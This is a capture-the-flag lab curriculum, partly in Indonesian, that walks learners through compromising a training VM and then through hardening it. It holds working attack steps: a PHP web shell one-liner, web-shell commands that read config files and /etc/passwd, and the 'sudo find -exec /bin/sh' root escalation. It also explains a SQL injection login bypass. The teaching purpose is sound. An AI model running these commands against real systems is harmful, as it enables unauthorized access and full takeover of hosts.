# ExamCorp CTF - Learning & Walkthrough Curriculum

Panduan modul pembelajaran praktikum Ethical Hacking & Capture The Flag (ExamCorp Lab).

---

## Table of Contents

### Track 01: Reconnaissance & Discovery
*Local network host identification via ARP and complete port/service enumeration using Nmap.*

- [Local Network Discovery & Host Identification (Est: 10 mins)](#module-network-discovery)
- [Port Enumeration & Service Profiling (Est: 12 mins)](#module-port-enumeration)

### Track 02: Web Exploitation & Initial Access
*Anonymous FTP intelligence gathering, SQL injection auth bypass, and PHP webshell execution.*

- [FTP Anonymous Access & Information Leakage (Est: 12 mins)](#module-ftp-recon)
- [SQL Injection Authentication Bypass (Est: 15 mins)](#module-sqli-auth-bypass)
- [Arbitrary File Upload & Remote Code Execution (Est: 15 mins)](#module-webshell-upload)

### Track 03: Lateral Movement & Privilege Escalation
*Harvesting leaked credentials, pivoting via SSH for the user flag, and escaping via sudo find to root.*

- [Credential Harvesting & Lateral Movement to SSH (Est: 15 mins)](#module-credential-harvesting)
- [Privilege Escalation via Sudo Find (Root Flag & GTFOBins) (Est: 15 mins)](#module-sudo-privesc-find)

### Track 04: Hardening & Defensive Remediation
*Fixing anonymous FTP access, applying PDO prepared statements, and enforcing least-privilege sudoers.*

- [Defensive Remediation & Infrastructure Hardening (Est: 14 mins)](#module-remediation-hardening)

---

## Module 01: Local Network Discovery & Host Identification {#module-network-discovery}

**Estimasi Waktu:** 10 Menit  
**Objektif:** Locate the target virtual machine on the local network using link-layer ARP scanning.

### Pendahuluan
In lab environments, target machines typically receive a dynamic IP via DHCP. Before any enumeration can begin, you need to figure out which IP belongs to the target - not your gateway, not your own machine. ARP is the most reliable tool for this on a local segment.

### Target Capaian (Learning Outcomes)
- Understand why ARP works even when ICMP ping is blocked.
- Use arp-scan to enumerate active hosts on the local interface.
- Distinguish the target VM from gateways and hypervisors using MAC OUI.

### Why ARP works on local networks

ARP operates at Layer 2, below the IP stack. Unlike ICMP ping, it cannot be filtered by standard host-based firewalls - a machine that blocks all ping requests still must answer ARP queries to function on the network.

Virtual machines expose their virtualization platform through the MAC vendor prefix (OUI). This is often your clearest signal for identifying which responding host is the target versus infrastructure.

- ARP replies are mandatory - hosts cannot silently ignore them.
- MAC vendor prefix (OUI) reveals the adapter type, helping distinguish VMs from physical machines.
- More reliable than ping on networks with ICMP restrictions.

### Running a local subnet scan

Scan your network interface and look for hosts you do not recognize. Pay attention to the vendor column - virtualization platforms have distinctive OUI prefixes.

#### Perintah & Langkah Praktik

**ARP scan of local subnet**
`ash
sudo arp-scan --localnet
`
- **Penjelasan:** Sends ARP queries to every valid address on the local interface and reports responding hosts with their MAC vendor.
- **Output yang dicari:** An unfamiliar IP whose MAC vendor matches a virtualization platform.

**Verify reachability**
`ash
ping -c 3 <TARGET_IP>
`
- **Penjelasan:** Confirm basic connectivity to the candidate IP once identified.
- **Output yang dicari:** Low round-trip time and 0% packet loss.

> **[Save the target IP]**  
> Store the confirmed address in a shell variable (`export TARGET=<TARGET_IP>`) so all subsequent commands stay consistent throughout your session.

### Kesalahan Umum yang Sering Terjadi
- Scanning a broad range when only the local subnet matters.
- Treating an ICMP non-response as "host offline" - ARP may still reply.
- Mistaking the default gateway for the target machine.

### Checkpoint Modul
*Confirm target identification before moving forward.*

1. Run arp-scan and list every responding host with its MAC vendor.
1. Identify the target based on vendor information and context.
1. Confirm basic network reachability before proceeding to port scanning.

---

## Module 02: Port Enumeration & Service Profiling {#module-port-enumeration}

**Estimasi Waktu:** 12 Menit  
**Objektif:** Discover all listening services on the target and profile their versions to identify potential attack vectors.

### Pendahuluan
Scanning only the default top-1000 ports is a common mistake. Non-standard services, internal management panels, and custom listeners often sit outside that range. A full sweep followed by version detection gives you the complete picture.

### Target Capaian (Learning Outcomes)
- Perform a full TCP port sweep with Nmap.
- Extract service banners and version strings.
- Triage open services by attack priority.

### Full-range port scan and version detection

Run Nmap against all 65,535 TCP ports and follow up with version probing on anything that is open.

#### Perintah & Langkah Praktik

**Full port and version scan**
`ash
nmap -sV -p- <TARGET_IP>
`
- **Penjelasan:** `-p-` covers all ports; `-sV` probes open ports to extract service and version information.
- **Output yang dicari:** Every open port and its associated service - note them all, even if they look uninteresting at first.

**Targeted NSE script scan**
`ash
nmap -sC -sV -p <PORT_LIST> <TARGET_IP>
`
- **Penjelasan:** Run default NSE scripts against specific ports for additional context like authentication policies and server headers.
- **Output yang dicari:** Misconfiguration hints, version-specific vulnerabilities, or services with anonymous access.

### Attack surface triage

Not all open ports deserve equal attention at first. Prioritize based on the attack surface each service typically presents:

- FTP (port 21): Often misconfigured to allow unauthenticated access - high priority for initial recon.
- HTTP/HTTPS (port 80/443): Web applications are rich sources of injection and upload vulnerabilities.
- SSH (port 22): Requires authentication - lower initial priority, but becomes valuable once credentials surface elsewhere.

> **[Methodology]**  
> Resist jumping straight to brute force. Gather intelligence from application-layer services first - credentials almost always leak through misconfigurations, not brute force.

### Kesalahan Umum yang Sering Terjadi
- Stopping at top-1000 ports and missing non-standard services.
- Brute-forcing SSH before exhausting FTP and web enumeration.
- Not recording version strings - they matter for vulnerability research.

### Checkpoint Modul
*Document the complete service inventory.*

1. List every open port with its service name and version string.
1. Mark which services may allow unauthenticated access.
1. Rank services by attack priority before proceeding.

---

## Module 03: FTP Anonymous Access & Information Leakage {#module-ftp-recon}

**Estimasi Waktu:** 12 Menit  
**Objektif:** Assess whether the FTP service allows unauthenticated access and identify any files that disclose internal information.

### Pendahuluan
FTP servers configured to allow anonymous login expose whatever files sit in the public directory. Developers sometimes leave backup files, internal notes, or source code there without realizing the access policy is open to anyone on the network.

### Target Capaian (Learning Outcomes)
- Test anonymous login against an FTP service.
- Enumerate available files including hidden dotfiles.
- Analyze downloaded files for intelligence about other services on the system.

### Testing anonymous authentication

The FTP protocol supports a special `anonymous` account. When prompted for a password, convention is to leave it empty or enter any email-like string. A successful login drops you into the public directory.

#### Perintah & Langkah Praktik

**Connect to FTP**
`ash
ftp <TARGET_IP>
`
- **Penjelasan:** Opens an interactive FTP session. At the name prompt, try `anonymous`.
- **Output yang dicari:** `230 Login successful` in the server response.

**Enumerate and download files**
`ash
ls -la
get <filename>
bye
`
- **Penjelasan:** List all entries including hidden files, then download anything that looks useful.
- **Output yang dicari:** Text files, backup archives, source files, or anything with an unusual extension.

### Extracting intelligence from downloaded files

Read everything you can download. Developer notes, internal memos, and backup files often contain pointers to other services, authentication mechanisms, or known unfixed issues.

#### Perintah & Langkah Praktik

**Inspect a downloaded file**
`ash
cat <filename>
`
- **Penjelasan:** Read the file contents carefully for any actionable intelligence.
- **Output yang dicari:** References to internal endpoints, source code patterns, usernames, or security warnings left by developers.

> **[Think laterally]**  
> A developer note mentioning a vulnerability or a hidden endpoint is not just background noise - it is a direct pointer to your next step.

### Kesalahan Umum yang Sering Terjadi
- Skipping anonymous login just because a password prompt appeared.
- Running only `ls` instead of `ls -la`, missing hidden dotfiles.
- Downloading files without reading them carefully.

### Checkpoint Modul
*Summarize what the FTP server disclosed.*

1. Confirm whether anonymous access is permitted.
1. Enumerate and download all accessible files.
1. Identify any intelligence relevant to other services on the target.

---

## Module 04: SQL Injection Authentication Bypass {#module-sqli-auth-bypass}

**Estimasi Waktu:** 15 Menit  
**Objektif:** Understand how dynamic SQL concatenation creates authentication bypass vulnerabilities and how to identify them.

### Pendahuluan
When a web application builds SQL queries by directly embedding user input into a string, an attacker can inject SQL syntax to change the query logic. The classic target is a login form - but the same flaw appears anywhere unsanitized input reaches a database query.

### Target Capaian (Learning Outcomes)
- Recognize insecure SQL string concatenation patterns in source code.
- Understand how comment sequences and boolean conditions can break query logic.
- Test a login form for SQL injection vulnerability.

### What makes a query injectable

A vulnerable authentication handler builds its query like this:

`$sql = "SELECT * FROM users WHERE username = '" . $user . "' AND password = '" . $pass . "'";`

User input is placed directly inside SQL syntax with no escaping or parameterization. Supplying a single quote breaks out of the string literal - anything after it gets interpreted as SQL, not data.

### How payloads manipulate query structure

Several approaches can force a login query to return a valid session:

- Closing the string and commenting out the remainder: the password check never executes.
- Injecting an `OR` condition that always evaluates to true: the query returns a row regardless of the actual password.
- SQL dialects differ in comment syntax - `--`, `-- -`, `#` - and choosing the wrong one silently breaks the payload.

#### Perintah & Langkah Praktik

**Test a login endpoint via curl**
`ash
curl -i -X POST http://<TARGET_IP>/<login_path> \'
  -d "username=<payload>" \'
  -d "password="
`
- **Penjelasan:** Submits a crafted POST to the login endpoint. Watch for an HTTP redirect or session cookie in the response.
- **Output yang dicari:** An HTTP 302 redirect to an authenticated page, or a `Set-Cookie` header indicating a session was created.

> **[Use source code as a guide]**  
> If you recovered a source file or backup, read how the login query is constructed. It will tell you exactly which characters to inject and which comment syntax the backend uses.

### Kesalahan Umum yang Sering Terjadi
- Using `#` comments on a backend that expects `--`, or vice versa.
- Forgetting to URL-encode special characters in curl requests.
- Assuming client-side form validation prevents the attack.

### Checkpoint Modul
*Assess the login form for SQL injection.*

1. Locate the login endpoint on the web application.
1. Analyze any available source code for SQL query construction.
1. Craft a payload that alters the query logic and observe the server response.

---

## Module 05: Arbitrary File Upload & Remote Code Execution {#module-webshell-upload}

**Estimasi Waktu:** 15 Menit  
**Objektif:** Understand how unrestricted file upload features can lead to remote code execution on a web server.

### Pendahuluan
File upload functionality is common in admin dashboards. When the server fails to validate file types and allows uploaded files to be executed by the web engine, any user with upload access can plant a script that runs arbitrary commands as the web server process.

### Target Capaian (Learning Outcomes)
- Construct a minimal PHP web shell.
- Identify upload endpoints that lack execution controls.
- Trigger command execution through an uploaded file and determine the execution context.

### A minimal PHP web shell

A web shell does not need to be complex. The simplest form accepts a command via a request parameter and passes it to a PHP built-in function like `system()`, `passthru()`, or `shell_exec()`.

#### Perintah & Langkah Praktik

**Create a one-line shell locally**
`ash
echo "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>" > shell.php
`
- **Penjelasan:** Creates a PHP file that executes whatever is passed in the `cmd` query parameter.
- **Output yang dicari:** A valid PHP file with no syntax errors.

### Uploading and verifying execution

Find the upload form in the authenticated dashboard, then upload your shell. After uploading, determine where the file was stored - check the page source or response body. Then trigger the shell by requesting the file with a command parameter.

#### Perintah & Langkah Praktik

**Trigger a command via web shell**
`ash
curl "http://<TARGET_IP>/<upload_path>/shell.php?cmd=id"
`
- **Penjelasan:** Sends a GET request with the `cmd` parameter to the uploaded shell.
- **Output yang dicari:** `uid=` output - this reveals which user the web server process is running as.

> **[Foothold established]**  
> Confirming command output means you have code execution on the server. Use this access to explore the filesystem - configuration files and system accounts are your next targets.

### Kesalahan Umum yang Sering Terjadi
- Trying complex payloads before verifying basic command execution works.
- Not URL-encoding spaces and special characters in query strings.
- Guessing the upload path instead of reading the server response.

### Checkpoint Modul
*Confirm remote code execution.*

1. Upload a minimal PHP shell via the admin upload form.
1. Locate the uploaded file URL from the server response.
1. Execute `id` through the shell and note the process owner.

---

## Module 06: Credential Harvesting & Lateral Movement to SSH {#module-credential-harvesting}

**Estimasi Waktu:** 15 Menit  
**Objektif:** Locate plaintext credentials in web application config files and test them against other services on the system.

### Pendahuluan
Web applications need database credentials to function, and those credentials live somewhere on disk. PHP config files under the web root are common hiding spots. The bigger problem is credential reuse - the same password found in a config file often works for SSH or other local accounts.

### Target Capaian (Learning Outcomes)
- Search the web root for configuration files containing hardcoded credentials.
- Cross-reference discovered usernames against system accounts.
- Test credential reuse against SSH.

### Finding hardcoded credentials

From your web shell, read configuration files in the web root. PHP apps commonly store connection parameters in files named `db_config.php`, `config.php`, `.env`, or similar. Look for variables holding usernames and passwords.

#### Perintah & Langkah Praktik

**Read a config file via webshell**
`ash
curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/var/www/html/<config_file>"
`
- **Penjelasan:** Use your web shell to read the contents of a configuration file on the server.
- **Output yang dicari:** Variables holding usernames and passwords, especially for database connections.

**Enumerate system accounts**
`ash
curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/etc/passwd"
`
- **Penjelasan:** Read the system user list to find accounts with interactive login shells.
- **Output yang dicari:** Entries ending in `/bin/bash` or `/bin/sh` - those are accounts you can potentially SSH into.

### Pivoting to SSH

Compare the username in the config file against the system account list. If there is a match, try the password against SSH. Credential reuse between application accounts and system accounts is extremely common.

#### Perintah & Langkah Praktik

**SSH login attempt**
`ash
ssh <username>@<TARGET_IP>
`
- **Penjelasan:** Attempt an interactive login using the credentials you discovered.
- **Output yang dicari:** A shell prompt - this confirms successful lateral movement to an interactive account.

**Check the home directory**
`ash
ls ~ && cat ~/user.txt
`
- **Penjelasan:** Look for the user flag file in the home directory.
- **Output yang dicari:** A file containing a value in `EH{...}` format.

> **[Flag 1 (User Flag)]**  
> Submit the value found in `~/user.txt` to Challenge 1 ("User Flag") in the CTF portal. To finish the competition, proceed to Module 07 for the privilege escalation path to the root flag.

### Kesalahan Umum yang Sering Terjadi
- Staying in the limited webshell when SSH gives a far more stable session.
- Only checking obvious config filenames - look for `.bak` files and hidden dotfiles too.
- Assuming credentials are unique to one service.

### Checkpoint Modul
*Verify lateral movement to a system account.*

1. Locate a configuration file containing hardcoded credentials.
1. Identify a system account matching the discovered username.
1. Attempt SSH login with the reused credentials and check the home directory for Flag 1.
1. Proceed to Module 07 to escalate to root.

---

## Module 07: Privilege Escalation via Sudo Find (Root Flag & GTFOBins) {#module-sudo-privesc-find}

**Estimasi Waktu:** 15 Menit  
**Objektif:** Audit sudo privileges on the compromised account, leverage GTFOBins binary execution to spawn a root shell, and capture the final root flag.

### Pendahuluan
After obtaining access as an unprivileged user, your final objective is complete system compromise (root). Linux sudo configurations often grant specific utility binaries NOPASSWD execution rights. Many of these utilities support command execution flags that can be abused to break out into a full root shell.

### Target Capaian (Learning Outcomes)
- Enumerate permitted sudo commands using `sudo -l`.
- Identify binaries with shell breakout capabilities using GTFOBins.
- Execute a privileged shell to obtain root access and retrieve Flag 2.

### Auditing Sudo Permissions

As soon as you obtain an interactive SSH shell as a standard user, check what commands you are permitted to run with elevated privileges.

#### Perintah & Langkah Praktik

**Enumerate sudo permissions**
`ash
sudo -l
`
- **Penjelasan:** Displays the sudoers configuration entries permitted for the current user.
- **Output yang dicari:** Entries marked with `NOPASSWD:` - particularly utility binaries such as `/usr/bin/find`.

### Abusing Binary Execution via GTFOBins

GTFOBins catalogs how Unix binaries can be exploited to bypass local security restrictions. When a binary like `find` is allowed in sudoers without a password, its execution parameters (such as `-exec`) can be used to run commands directly as root.

#### Perintah & Langkah Praktik

**Spawn interactive root shell**
`ash
sudo find . -exec /bin/sh \; -quit
`
- **Penjelasan:** Executes `/bin/sh` through find with root privileges. The `-quit` argument exits find immediately after the shell terminates.
- **Output yang dicari:** The terminal prompt changes from `$` to `#`, signifying root execution context.

**Verify root context**
`ash
whoami && id
`
- **Penjelasan:** Confirms that the active process is operating with effective root user privileges.
- **Output yang dicari:** `root` and `uid=0(root) gid=0(root)` in the output.

### Capturing the Root Flag

With root privileges established, navigate to the administrator home directory (`/root`) to retrieve the second and final competition flag.

#### Perintah & Langkah Praktik

**Read root flag**
`ash
cat /root/root.txt
`
- **Penjelasan:** Displays the contents of the root flag file located in the `/root` directory.
- **Output yang dicari:** A string starting with `EH{` representing the root flag.

> **[Flag 2 (Root Flag)]**  
> Submit the recovered value to Challenge 2 ("Root Flag") in the CTF portal to complete the challenge.

### Kesalahan Umum yang Sering Terjadi
- Not running `sudo -l` immediately after landing on a new account.
- Overlooking binaries that seem harmless without checking GTFOBins.
- Failing to verify root identity before proceeding.

### Checkpoint Modul
*Confirm full root compromise.*

1. Run `sudo -l` to discover permitted binaries.
1. Apply the GTFOBins execution technique to spawn a root shell.
1. Confirm root identity with `whoami` and `id`.
1. Read `/root/root.txt` and submit Flag 2 in the portal.

---

## Module 08: Defensive Remediation & Infrastructure Hardening {#module-remediation-hardening}

**Estimasi Waktu:** 14 Menit  
**Objektif:** Apply least-privilege principles, secure configurations, and defensive controls to fix every vulnerability in the attack chain.

### Pendahuluan
An attack path is only as useful as the defense it inspires. Understanding how the ExamCorp server was breached enables system administrators and developers to patch the root causes across all layers.

### Target Capaian (Learning Outcomes)
- Disable anonymous access in vsftpd configuration.
- Refactor dynamic SQL queries to use secure PDO prepared statements.
- Harden file upload endpoints against web shell execution.
- Apply least-privilege principles to sudoers configuration.

### 1. Hardening FTP configuration

In `/etc/vsftpd.conf`, anonymous access should always be disabled unless strictly required by public distribution requirements.

#### Perintah & Langkah Praktik

**Disable anonymous FTP in vsftpd.conf**
`ash
sudo sed -i 's/anonymous_enable=YES/anonymous_enable=NO/g' /etc/vsftpd.conf
sudo systemctl restart vsftpd
`
- **Penjelasan:** Disables anonymous authentication and restarts the daemon.
- **Output yang dicari:** `anonymous_enable=NO` in `/etc/vsftpd.conf`.

### 2. Remediating SQL injection with Prepared Statements

Replace vulnerable string concatenation with parameterized SQL queries using PHP PDO:

#### Perintah & Langkah Praktik

**Secure PDO authentication pattern**
`ash
$stmt = $pdo->prepare("SELECT id, username, password FROM users WHERE username = :user");
$stmt->execute(['user' => $username]);
$user = $stmt->fetch();
if ($user && password_verify($password, $user['password'])) {
    // Login successful
}
`
- **Penjelasan:** Parameters are sent separately from query logic, preventing SQL injection completely.
- **Output yang dicari:** Use of `prepare()` and `password_verify()`.

### 3. Protecting file upload directories

Never permit script execution in directories where uploaded files are stored. In Apache, disable the PHP engine for `/uploads` in `.htaccess` or virtual host configuration:

#### Perintah & Langkah Praktik

**Disable PHP engine in uploads directory**
`ash
# /var/www/html/uploads/.htaccess
<FilesMatch "\.(php|phtml|php3|php4|php5|php7|phps)$">
    SetHandler None
    Require all denied
</FilesMatch>
php_flag engine off
`
- **Penjelasan:** Prevents the web server from executing any PHP files uploaded by users.
- **Output yang dicari:** Direct download or 403 Forbidden instead of code execution.

### 4. Enforcing least privilege in sudoers

Never grant sudo permissions to binaries that provide shell escapes or interactive execution (like `find`, `vi`, `less`, `awk`, `nmap`).

If a user only needs to search files, configure specific scripts or inspect whether root privilege is truly necessary.

#### Perintah & Langkah Praktik

**Safe sudoers rule**
`ash
# Remove dangerous binary permissions:
# examuser ALL=(root) NOPASSWD: /usr/bin/find

# Replace with a specific, hardened maintenance script:
examuser ALL=(root) NOPASSWD: /usr/local/bin/safe_backup.sh
`
- **Penjelasan:** Restrict sudo execution to tightly controlled, non-interactive scripts with absolute paths.
- **Output yang dicari:** Clean `sudo -l` output without generic GTFOBins binaries.

### Kesalahan Umum yang Sering Terjadi
- Relying on client-side validation instead of backend controls.
- Blacklisting specific file extensions (.php) instead of whitelisting (.png, .jpg).
- Granting broad NOPASSWD sudo access for convenience.

### Checkpoint Modul
*Conduct a post-remediation security audit.*

1. Verify `anonymous` FTP login is rejected with `530 Permission denied`.
1. Verify SQL injection bypass payloads return authentication errors.
1. Verify uploaded `.php` files are denied or served as plaintext without executing.
1. Verify `sudo -l` does not list `/usr/bin/find`.

---

